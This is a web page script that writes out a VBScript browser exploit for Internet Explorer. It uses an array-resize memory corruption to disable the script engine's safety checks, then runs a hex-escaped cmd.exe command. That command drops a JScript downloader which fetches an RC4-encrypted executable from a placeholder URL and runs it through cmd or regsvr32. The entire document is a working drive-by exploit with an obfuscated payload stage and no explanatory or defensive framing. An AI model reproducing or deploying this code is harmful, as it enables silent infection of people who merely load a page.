<script type="text/javascript"><!--
document.write( '<head>\n' );
document.write( '    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=10\">\n' );
document.write( '</head>\n' );
document.write( '<body>\n' );
document.write( '    <script type=\"text/vbscript\">\n' );
document.write( '        Dim aw\n' );
document.write( '        Dim plunge(32)\n' );
document.write( '        Dim y(32)\n' );
document.write( '        prefix = \"%u4141%u4141\"\n' );
document.write( '        d = prefix & \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n' );
document.write( '        b = String(64000, \"D\")\n' );
document.write( '        c = d & b\n' );
document.write( '        x = UnEscape(c)\n' );
document.write( '\n' );
document.write( '        Class ArrayWrapper\n' );
document.write( '            Dim A()\n' );
document.write( '            Private Sub Class_Initialize\n' );
document.write( '                ReDim Preserve A(1, 2000)\n' );
document.write( '            End Sub\n' );
document.write( '\n' );
document.write( '            Public Sub Resize()\n' );
document.write( '                ReDim Preserve A(1, 1)\n' );
document.write( '            End Sub\n' );
document.write( '        End Class\n' );
document.write( '\n' );
document.write( '        Class Dummy\n' );
document.write( '        End Class\n' );
document.write( '\n' );
document.write( '        Function getAddr (arg1, s)\n' );
document.write( '            aw = Null\n' );
document.write( '            Set aw = New ArrayWrapper\n' );
document.write( '\n' );
document.write( '            For i = 0 To 32\n' );
document.write( '                Set plunge(i) = s\n' );
document.write( '            Next\n' );
document.write( '\n' );
document.write( '            Set aw.A(arg1, 2) = s\n' );
document.write( '\n' );
document.write( '            Dim addr\n' );
document.write( '            Dim i\n' );
document.write( '            For i = 0 To 31\n' );
document.write( '                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n' );
document.write( '                    addr = strToInt(Mid(y(i), 3 + 4, 2))\n' );
document.write( '                End If\n' );
document.write( '                y(i) = Null\n' );
document.write( '            Next\n' );
document.write( '\n' );
document.write( '            If addr = Null Then\n' );
document.write( '                document.location.href = document.location.href\n' );
document.write( '                Return\n' );
document.write( '            End If\n' );
document.write( '\n' );
document.write( '            getAddr = addr\n' );
document.write( '        End Function\n' );
document.write( '\n' );
document.write( '        Function leakMem (arg1, addr)\n' );
document.write( '            d = prefix & \"%u0008%u4141%u4141%u4141\"\n' );
document.write( '            c = d & intToStr(addr) & b\n' );
document.write( '            x = UnEscape(c)\n' );
document.write( '            aw = Null\n' );
document.write( '            Set aw = New ArrayWrapper\n' );
document.write( '            Dim o\n' );
document.write( '            o = aw.A(arg1, 2)\n' );
document.write( '            leakMem = o\n' );
document.write( '        End Function\n' );
document.write( '\n' );
document.write( '        Sub overwrite (arg1, addr)\n' );
document.write( '            d = prefix & \"%u400C%u0000%u0000%u0000\"\n' );
document.write( '            c = d & intToStr(addr) & b\n' );
document.write( '            x = UnEscape(c)\n' );
document.write( '            aw = Null\n' );
document.write( '            Set aw = New ArrayWrapper\n' );
document.write( '            aw.A(arg1, 2) = CSng(0)\n' );
document.write( '        End Sub\n' );
document.write( '\n' );
document.write( '        Sub overwrite2 (arg1, addr)\n' );
document.write( '            Dim emptyval\n' );
document.write( '            d = prefix & \"%u400C%u0000%u0000%u0000\"\n' );
document.write( '            c = d & intToStr(addr) & b\n' );
document.write( '            x = UnEscape(c)\n' );
document.write( '            aw = Null\n' );
document.write( '            Set aw = New ArrayWrapper\n' );
document.write( '            aw.A(arg1, 2) = emptyval\n' );
document.write( '        End Sub\n' );
document.write( '\n' );
document.write( '        Function exploit (arg1)\n' );
document.write( '            Dim addr\n' );
document.write( '            Dim csession\n' );
document.write( '            Dim olescript\n' );
document.write( '            Dim mem\n' );
document.write( '            Set dm = New Dummy\n' );
document.write( '            addr = getAddr(arg1, dm)\n' );
document.write( '            mem = leakMem(arg1, addr + 8)\n' );
document.write( '            csession = strToInt(Mid(mem, 3, 2))\n' );
document.write( '            mem = leakMem(arg1, csession + 4)\n' );
document.write( '            olescript = strToInt(Mid(mem, 1, 2))\n' );
document.write( '            overwrite arg1, olescript + &H174\n' );
document.write( '	    fire() \n' );
document.write( '            overwrite2 arg1, olescript + &H174\n' );
document.write( '        End Function\n' );
document.write( '\n' );
document.write( '	function fire()\n' );
document.write( '	  On Error Resume Next\n' );
document.write( '	  Set w=CreateObject(\"WScript.Shell\")\n' );
document.write( '	  key=\"rc4 key\"\n' );
document.write( '      url=\"rc4 url\"\n' );
document.write( '	  uas=Navigator.UserAgent\n' );
document.write( '	  str=UnEscape(\"%63%6D%64%2E%65%78%65%20%2F%71%20%2F%63%20%63%64%20%2F%64%20%22%25%74%6D%70%25%22%20%26%26%20%65%63%68%6F%20%66%75%6E%63%74%69%6F%6E%20%4C%6F%67%28%6E%2C%67%29%7B%66%6F%72%28%76%61%72%20%63%3D%30%2C%73%3D%53%74%72%69%6E%67%2C%64%2C%44%3D%22%5C%78%37%30%75%73%5C%78%36%38%22%2C%62%3D%5B%5D%2C%69%3D%5B%5D%2C%72%3D%30%33%37%37%2C%61%3D%30%3B%72%2B%31%5E%3E%61%3B%61%2B%2B%29%62%5B%61%5D%3D%61%3B%66%6F%72%28%61%3D%30%3B%72%2B%31%5E%3E%61%3B%61%2B%2B%29%63%3D%63%2B%62%5B%61%5D%2B%67%5B%76%5D%28%61%25%67%2E%6C%65%6E%67%74%68%29%5E%26%72%2C%64%3D%62%5B%61%5D%2C%62%5B%61%5D%3D%62%5B%63%5D%2C%62%5B%63%5D%3D%64%3B%66%6F%72%28%76%61%72%20%65%3D%63%3D%61%3D%30%2C%53%3D%22%66%72%6F%6D%43%68%61%72%43%6F%64%65%22%3B%65%5E%3C%6E%2E%6C%65%6E%67%74%68%3B%65%2B%2B%29%61%3D%61%2B%31%5E%26%72%2C%63%3D%63%2B%62%5B%61%5D%5E%26%72%2C%64%3D%62%5B%61%5D%2C%62%5B%61%5D%3D%62%5B%63%5D%2C%62%5B%63%5D%3D%64%2C%69%5B%44%5D%28%73%5B%53%5D%28%6E%5B%76%5D%28%65%29%5E%5E%62%5B%62%5B%61%5D%2B%62%5B%63%5D%5E%26%72%5D%29%29%3B%72%65%74%75%72%6E%20%69%5B%75%28%31%35%29%5D%28%75%28%31%31%29%29%7D%3B%66%75%6E%63%74%69%6F%6E%20%48%28%67%29%7B%76%61%72%20%54%3D%75%28%30%29%2C%64%3D%57%28%54%2B%22%2E%22%2B%54%2B%75%28%31%29%29%3B%64%5B%22%5C%78%37%33%65%74%5C%78%35%30%72%6F%5C%78%37%38%79%22%5D%28%6E%29%3B%64%2E%6F%70%65%6E%28%75%28%32%29%2C%67%28%31%29%2C%6E%29%3B%64%2E%4F%70%74%69%6F%6E%28%30%29%3D%67%28%32%29%3B%64%5B%22%5C%78%35%33%65%6E%5C%78%36%34%22%5D%3B%69%66%28%30%33%31%30%3D%3D%64%2E%73%74%61%74%75%73%29%72%65%74%75%72%6E%20%4C%6F%67%28%64%5B%22%72%65%73%5C%78%37%30%6F%5C%78%36%65%5C%78%37%33%65%5C%78%35%34%65%78%74%22%5D%2C%67%28%6E%29%29%7D%3B%45%3D%22%57%69%6E%48%54%54%50%4D%52%65%71%75%65%73%74%2E%35%2E%31%4D%47%45%54%4D%53%63%72%69%70%74%69%6E%67%2E%46%69%6C%65%53%79%73%74%65%6D%4F%62%6A%65%63%74%4D%57%53%63%72%69%70%74%2E%53%68%65%6C%22%2B%22%6C%4D%41%44%4F%44%42%2E%53%74%72%65%61%6D%4D%65%72%6F%4D%2E%65%78%22%2C%75%3D%66%75%6E%63%74%69%6F%6E%28%78%29%7B%72%65%74%75%72%6E%20%45%2E%73%70%6C%69%74%28%22%5C%78%34%64%22%29%5B%78%5D%7D%2C%4A%3D%41%63%74%69%76%65%58%4F%62%6A%65%63%74%2C%57%3D%66%75%6E%63%74%69%6F%6E%28%76%29%7B%72%65%74%75%72%6E%20%6E%65%77%20%4A%28%76%29%7D%3B%74%72%79%7B%45%2B%3D%22%65%4D%47%65%74%54%65%22%2B%22%6D%70%4E%61%6D%65%4D%63%68%61%72%43%6F%64%65%41%74%4D%69%73%6F%2D%38%38%35%39%2D%31%4D%4D%69%6E%64%65%78%4F%22%2B%22%66%4D%2E%64%22%2B%22%6C%6C%4D%53%63%72%22%2B%22%69%70%74%46%22%2B%22%75%6C%6C%4E%61%22%2B%22%6D%65%4D%6A%6F%22%2B%22%69%6E%4D%72%22%2B%22%75%6E%4D%20%2F%63%20%4D%20%2F%73%20%22%3B%76%61%72%20%71%3D%57%28%75%28%33%29%29%2C%6A%3D%57%28%75%28%34%29%29%2C%73%3D%57%28%75%28%35%29%29%2C%70%3D%75%28%37%29%2C%6E%3D%30%2C%4C%3D%57%53%63%72%69%70%74%5B%75%28%31%34%29%5D%2C%76%3D%75%28%39%29%2C%6D%3D%57%53%63%72%69%70%74%2E%41%72%67%75%6D%65%6E%74%73%3B%73%2E%54%79%70%65%3D%32%3B%63%3D%71%5B%75%28%38%29%5D%28%29%3B%73%2E%43%68%61%72%73%65%74%3D%75%28%30%31%32%29%3B%73%2E%4F%70%65%6E%28%29%3B%69%3D%48%28%6D%29%3B%64%3D%69%5B%76%5D%28%69%5B%75%28%31%32%29%5D%28%22%50%5C%78%34%35%5C%78%30%30%5C%78%30%30%22%29%2B%30%32%37%29%3B%73%2E%77%72%69%74%65%74%65%78%74%28%69%29%3B%69%66%28%30%33%37%5E%3C%64%29%7B%76%61%72%20%7A%3D%31%3B%63%2B%3D%75%28%31%33%29%7D%65%6C%73%65%20%63%2B%3D%70%3B%73%2E%73%61%76%65%74%6F%66%69%6C%65%28%63%2C%32%29%3B%73%2E%43%6C%6F%73%65%28%29%3B%7A%5E%26%5E%26%28%63%3D%22%5C%78%37%32%65%67%5C%78%37%33%76%72%33%5C%78%33%32%22%2B%70%2B%75%28%31%38%29%2B%63%29%3B%6A%5B%75%28%31%36%29%5D%28%22%63%6D%5C%78%36%34%22%2B%70%2B%75%28%31%37%29%2B%63%2C%30%29%7D%63%61%74%63%68%28%59%29%7B%7D%71%5B%22%44%65%5C%78%36%63%65%74%5C%78%36%35%5C%78%36%36%69%6C%65%22%5D%28%4C%29%3B%3E%49%6E%6A%36%73%46%6F%73%70%20%26%26%20%73%74%61%72%74%20%77%73%63%72%69%70%74%20%2F%2F%42%20%2F%2F%45%3A%4A%53%63%72%69%70%74%20%49%6E%6A%36%73%46%6F%73%70%20%22\")&key&Chr(34)&Chr(32)&Chr(34)&url&Chr(34)&Chr(32)&Chr(34)&uas&Chr(34)\n' );
document.write( '	  w.Run str,0\n' );
document.write( '	end function\n' );
document.write( '\n' );
document.write( '        Function triggerBug\n' );
document.write( '            aw.Resize()\n' );
document.write( '            Dim i\n' );
document.write( '            For i = 0 To 32\n' );
document.write( '                y(i) = Mid(x, 1, 24000)\n' );
document.write( '            Next\n' );
document.write( '        End Function\n' );
document.write( '    </script>\n' );
document.write( '\n' );
document.write( '    <script type=\"text/javascript\">\n' );
document.write( '        function strToInt(s)\n' );
document.write( '        {\n' );
document.write( '            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);\n' );
document.write( '        }\n' );
document.write( '        function intToStr(x)\n' );
document.write( '        {\n' );
document.write( '            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);\n' );
document.write( '        }\n' );
document.write( '        var o;\n' );
document.write( '        o = {\"valueOf\": function () {\n' );
document.write( '                triggerBug();\n' );
document.write( '                return 1;\n' );
document.write( '            }};\n' );
document.write( '        setTimeout(function() {exploit(o);}, 50);\n' );
document.write( '    </script>\n' );
document.write( '</body>\n' );
//-->



</script>
